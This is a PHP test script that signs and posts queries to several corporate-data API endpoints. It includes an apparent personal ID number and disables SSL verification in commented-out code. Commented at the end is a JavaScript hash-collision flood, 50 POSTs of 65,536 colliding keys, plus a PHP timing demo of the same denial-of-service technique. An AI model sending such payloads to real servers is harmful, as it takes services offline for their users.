<?php

use Carbon\Carbon;
use wanghanwanghan\someUtils\control;

include './vendor/autoload.php';

$url = 'https://api.meirixindong.com/provide/v1/qq/getThreeYearsDataForLIAGRO_REL';
$url = 'https://api.meirixindong.com/provide/v1/ts/getRegisterInfo';
$url = 'https://api.meirixindong.com/provide/v1/xd/getFinanceBaseData';
$url = 'https://api.meirixindong.com/provide/v1/xd/getFinanceCalData';
$url = 'https://api.meirixindong.com/provide/v1/fyy/entout/org';
$url = 'https://api.meirixindong.com/provide/v1/fyy/entout/people';
$url = 'https://api.meirixindong.com/provide/v1/ts/getGoodsInfo';
$url = 'https://api.meirixindong.com/provide/v1/xd/getFinanceBaseMergeData';

$appId = 'PHP_is_the_best_language_in_the_world';
$appSecret = 'PHP_GO';
$time = time();
$sign = substr(strtoupper(md5($appId . $appSecret . $time)), 0, 30);

$data = [
    'appId' => $appId,
    'time' => $time,
    'sign' => $sign,
    // 'image' => new \CURLFile(realpath('./WechatIMG261-tuya.png'))
    'entName' => '北京京东世纪贸易有限公司',
    'id' => '370503198409120910',
    'code' => '',
    'year' => '2019',
    'dataCount' => '3',
    'page' => 1,
    'pageSize' => 10,
];

//江苏彩虹永能新能源有限公司
//中国葛洲坝集团建设工程有限公司
//远东电缆有限公司
//江苏中能硅业科技发展有限公司
//远景能源有限公司
//许继集团有限公司

//$curl = curl_init();//初始化
//curl_setopt($curl, CURLOPT_URL, $url);//设置请求地址
//curl_setopt($curl, CURLOPT_POST, true);//设置post方式请求
//curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 15);//几秒后没链接上就自动断开
//curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
//curl_setopt($curl, CURLOPT_POSTFIELDS, $data);//提交的数据
//curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);//返回值不直接显示
//$res = curl_exec($curl);//发送请求
//dd(json_decode($res, true));

//    哈希碰创
//    let size= Math.pow(2, 16)
//    let data = {}
//    let maxKey = (size- 1) * size
//    for (let key = 0; key <= maxKey; key += size){
//    data[key] = key;
//    }
//    for (let i = 0; i < 50; i++){
//    let xhr = new XMLHttpRequest()
//        xhr.open("POST", "/")
//        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8")
//        xhr.send(JSON.stringify(data))
//    }

//$size = pow(2, 16);
//$startTime = microtime(true);
//$array = array();
//
//for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) {
//    $array[$key] = 0;
//}
//
//$endTime = microtime(true);
//
//echo '插入 ', $size, ' 个恶意的元素需要 ', $endTime - $startTime, ' 秒', "\n";
//
//$startTime = microtime(true);
//$array = array();
//
//for ($key = 0, $maxKey = $size - 1; $key <= $maxKey; ++$key) {
//    $array[$key] = 0;
//}
//
//$endTime = microtime(true);
//
//echo '插入 ', $size, ' 个普通元素需要 ', $endTime - $startTime, ' 秒', "\n";





